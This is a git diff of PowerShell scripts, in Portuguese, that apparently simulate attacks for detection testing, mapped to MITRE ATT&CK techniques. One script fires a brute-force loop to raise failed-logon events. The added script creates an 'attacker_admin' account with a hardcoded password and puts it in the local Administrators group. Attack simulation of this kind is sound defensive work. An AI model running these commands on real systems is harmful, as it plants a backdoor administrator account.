@@ -1,4 +1,4 @@
-# Script para simular ataque de Forca Bruta (Credential Access - T1110)
+#  ataque_forca_bruta.ps1  Script para simular ataque de Forca Bruta (Credential Access - T1110)
 Write-Host "Iniciando simulacao de Forca Bruta (Event ID 4625)..."
 
 1..10 | ForEach-Object { 
@@ -6,3 +6,12 @@ Write-Host "Iniciando simulacao de Forca Bruta (Event ID 4625)..."
 }
 
 Write-Host "Simulacao concluida."
+
+
+# escalonamento_privilegio.ps1 Script para simular Escalonamento de Privilegios (Local Account - T1136.001)
+Write-Host "Tentando criar usuario administrador oculto..."
+
+net user attacker_admin P@ssw0rd2026! /add
+net localgroup Administrators attacker_admin /add
+
+Write-Host "Comandos executados."
